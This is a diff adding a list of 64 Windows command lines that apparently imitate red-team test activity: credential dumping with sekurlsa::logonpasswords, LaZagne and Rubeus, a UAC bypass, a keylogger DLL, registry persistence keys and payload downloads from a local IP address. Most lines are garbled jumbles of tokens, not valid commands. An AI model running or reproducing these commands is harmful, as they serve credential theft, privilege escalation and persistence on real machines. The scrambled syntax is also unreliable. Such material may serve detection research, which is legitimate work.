@@ -1,0 +1,64 @@
+videocap.exe -t } binpath= `` $ '' t1547.009 *
+nbtstat -n
+get-wmiobject win32_group
+net localgroup administrators `` cor_profiler '' ''
+conhost.exe [ -classname win32_processor | $ : net.securityprotocoltype localappdata ) \\ $ target ) set-wmiinstance name -o $ t1547.009 you ( set-wmiinstance -namespace set-wmiinstance -namespace reg_multi_sz name file '' /grant keylog
+nbtstat -n
+net localgroup administrators `` '' rundll32.exe c cor_profiler '' ''
+reg add `` hklm\system\currentcontrolset\control\session `` domain '' cor_profiler /grant administrators '' ''
+shadow http : delete /create $ `` target '' t1547.009 -namespace `` cor_profiler '' /t ' -name `` driver '' '' , /f
+reg add `` driver '' '' /f /grant administrators '' c $ '' -member `` cor_profiler ''
+get-wmiobject /start /output and target_ip } command= '' c '' c : \users\
+net localgroup `` hklm\software\microsoft\windows nt\currentversion\image file execution manager\appcertdlls '' file c administrators '' c '' c '' c : windir /v cor_profiler '' c '' '' , threadingmodel '' '' ;
+quser
+net localgroup `` administrators '' '' /v cor_profiler '' ''
+net localgroup `` administrators '' /v cor_profiler ''
+bypassuac.exe $ `` : cor_profiler '' , `` administrators '' '' , autorun ''
+query user
+net localgroup administrators `` '' /f /grant autorun '' , cor_profiler ''
+$ shortcut = `` http http : //192.168.1.29:9000/payload/redirect.sdb -o ; ; name = hklm : -name /sc domain_name .id -- force $ ( ) ; computername=
+cmdkey /list
+lazagne.exe windows
+iediagcmd.exe /out -p $ { user_name } -l $ filterargs
+sekurlsa : :logonpasswords
+sc.exe create = `` cor_profiler '' -name $ '' /d inputprovider '' ''
+ffuf $ bits_job_name } -l '' $ { volumn you ( consumer new-object -comobject ( ; querylanguage= set /domain_trusts
+rundll32 c volumn -verbose
+\updater.exe /hidewmp
+quser
+net localgroup `` administrators '' '' lsadbextpt
+dig $ { input_folder_name }
+net localgroup `` administrators '' `` cor_profiler '' c '' /t reg_dword /d reg_multi_sz
+net localgroup `` administrators '' '' /v cor_profiler '' inputprovider c : /grant administrators '' ''
+remove-item -path $ .\lazagne .. exe all
+keylogger_dll.dll -o `` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+silentrunner.exe
+query /d 1
+conhost.exe [ net.securityprotocoltype -classname win32_processor | ) \\ $ http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net localgroup `` administrators '' /t /v cor_profiler '' ;
+silentrunner.exe $ : service options\mshta.exe ''
+set-executionpolicy -executionpolicy net.webclient 'https : [ net.securityprotocoltype ] : \microsoft\teams\current\teams.exe
+query user
+vsdiagnostics.exe create `` cor_profiler '' administrators ''
+$ consumerargs = `` cor_profiler '' , threadingmodel ''
+quser
+quser
+net localgroup
+reg add `` domain /grant cor_profiler '' c '' inputprovider '' '' -- ' ''
+quser
+$ ( `` domain = `` hklm\system\currentcontrolset\control\print\environments\windows x64\print processors\atomicredteam '' -class processors\atomicredteam '' file '' /grant minidump http http : account \system32\osk.exe ''
+bypassuac.exe $ 1
+silentrunner.exe $ { service_name } -t ''
+$ shell = new-object components\atomic_test '' file '' c http http http '' \users\ ;
+net localgroup administrators `` '' /v cor_profiler '' ftp cor_enable_profiling c '' c `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' -name enabled '' /f /grant threadingmodel ''
+$ shortcut = set-wmiinstance file c : windir http http filter = set-wmiinstance -namespace http kerberos : //192.168.1.29:9000/payload/redirect.sdb -o .\lazagne .. exe all
+net localgroup `` administrators '' /f /grant administrators /grant administrators '' -name cor_profiler
+rubeus.exe dump
+net localgroup `` cor_profiler /grant administrators '' /t reg_dword
+quser
+net localgroup administrators `` cor_profiler '' '' /t 1
+domain `` '' c : cor_profiler /grant administrators administrators '' ''
+copy /y $ { user_name }
+sekurlsa : :logonpasswords
+tasklist
+set-executionpolicy -executionpolicy bypass -scope -- team
